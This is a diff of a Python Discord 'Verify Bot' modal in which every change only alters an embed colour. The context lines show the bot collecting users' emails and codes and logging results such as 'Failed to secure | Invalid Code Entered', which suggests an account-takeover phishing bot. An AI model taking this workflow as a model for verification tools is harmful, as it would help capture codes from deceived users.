@@ -33,7 +33,7 @@ class MyModalTwo(ui.Modal):
                     embed = Embed(
                         title = "Could not verify",
                         description = "Our systems seem to be down at the moment. Please try again in a few hours.",
-                        color = 0xFF5C5C
+                        color = 0xFA4343
                     ), 
                     ephemeral = True
                 )
@@ -43,7 +43,7 @@ class MyModalTwo(ui.Modal):
                     Embed(
                         description = f"**Email** | **Status** | **Reason**\n```{self.email} | Refused to Verify | User has been blacklisted```",
                         timestamp = datetime.datetime.now(),
-                        colour = 0xFF5C5C
+                        colour = 0xFA4343
                     ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
                     view = ButtonOptions(interaction.user, interaction.user.id, self.username),
                     email = self.email
@@ -84,7 +84,7 @@ class MyModalTwo(ui.Modal):
             embed = discord.Embed(
                 description = f"**Email** | **Status** | **Reason**\n```{self.email} | Failed to secure | Invalid Code Entered```",
                 timestamp = datetime.datetime.now(),
-                colour = 0xFF5C5C                  
+                colour = 0xFA4343                  
             ).set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}")
             
             if self.username and self.username.strip():
